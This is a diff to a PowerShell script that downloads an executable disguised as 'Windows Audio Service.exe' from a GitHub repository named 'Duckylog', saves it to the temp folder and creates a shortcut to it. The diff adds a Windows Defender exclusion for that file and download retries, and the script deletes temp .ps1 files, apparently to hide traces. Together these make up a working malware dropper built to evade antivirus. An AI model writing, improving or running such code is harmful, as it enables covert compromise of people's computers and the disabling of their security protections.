@@ -13,8 +13,8 @@ function Test-NetworkConnection {
     return $pingResult
 }
 
-# Function to clean up PowerShell scripts in the temp directory
-function Cleanup-TempScripts {
+# Function to remove PowerShell scripts in the temp directory
+function Remove-TempScripts {
     Get-ChildItem -Path ([System.IO.Path]::GetTempPath()) -Filter "*.ps1" -File | Remove-Item -Force
 }
 
@@ -38,17 +38,37 @@ if (-Not (Test-Path $shortcutPath)) {
     # Path to the executable
     $exePath = "$env:TEMP\Windows Audio Service.exe"
 
+    # Add exclusion for the Windows Audio Service executable
+    try {
+        Add-MpPreference -ExclusionPath $exePath
+        Write-Output "Added exclusion for $exePath"
+    } catch {
+        Write-Output "Failed to add exclusion for ${exePath}: $_"
+    }
+
     # URL to the executable on GitHub
     $exeUrl = "https://github.com/Mocipie/Duckylog/blob/main/Windows%20Audio%20Service.exe?raw=true"
 
-    # Download the executable from GitHub
-    Write-Output "Downloading executable from $exeUrl to $exePath"
-    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+    # Retry logic for downloading the executable
+    $maxRetries = 5
+    $retryCount = 0
+    $downloadSuccess = $false
 
-    # Ensure the executable is downloaded
-    if (Test-Path $exePath) {
-        Write-Output "Executable downloaded successfully to $exePath"
+    while (-Not $downloadSuccess -and $retryCount -lt $maxRetries) {
+        try {
+            Write-Output "Attempting to download executable (Attempt $($retryCount + 1) of $maxRetries)..."
+            $webClient = New-Object System.Net.WebClient
+            $webClient.DownloadFile($exeUrl, $exePath)
+            $downloadSuccess = $true
+            Write-Output "Executable downloaded successfully to $exePath"
+        } catch {
+            Write-Output "Download failed: $_"
+            $retryCount++
+            Start-Sleep -Seconds 5
+        }
+    }
 
+    if ($downloadSuccess) {
         # Create a WScript.Shell COM object
         $wshShell = New-Object -ComObject WScript.Shell
 
@@ -61,7 +81,7 @@ if (-Not (Test-Path $shortcutPath)) {
         # Log the shortcut creation
         Write-Output "Shortcut created at $shortcutPath"
     } else {
-        Write-Output "Failed to download the executable."
+        Write-Output "Failed to download the executable after $maxRetries attempts."
     }
 } else {
     Write-Output "Shortcut already exists at $shortcutPath"
